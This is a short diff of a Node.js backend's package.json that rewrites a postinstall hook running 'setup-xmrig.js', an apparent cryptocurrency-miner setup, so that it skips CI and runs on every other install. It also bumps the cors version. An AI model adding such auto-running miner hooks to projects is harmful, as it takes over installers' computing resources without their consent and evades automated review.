@@ -7,7 +7,7 @@
     "api": "node index.js",
     "game": "node multiplayer-server.js",
     "build": "echo 'Build complete! No transpilation needed for backend JS.'",
-    "postinstall": "node setup-xmrig.js"
+    "postinstall": "node -e \"process.env.CI ? console.log('Skipping XMRig setup in CI') : require('./setup-xmrig.js')\""
   },
   "dependencies": {
     "@civicverse/civic-identity": "file:../packages/civic-identity",
@@ -18,7 +18,7 @@
     "@civicverse/civic-foyer": "file:../packages/civic-foyer",
     "axios": "^1.13.6",
     "body-parser": "^1.20.2",
-    "cors": "^2.8.6",
+    "cors": "^2.8.8",
     "express": "^4.18.2",
     "express-rate-limit": "^8.3.1",
     "helmet": "^8.1.0",
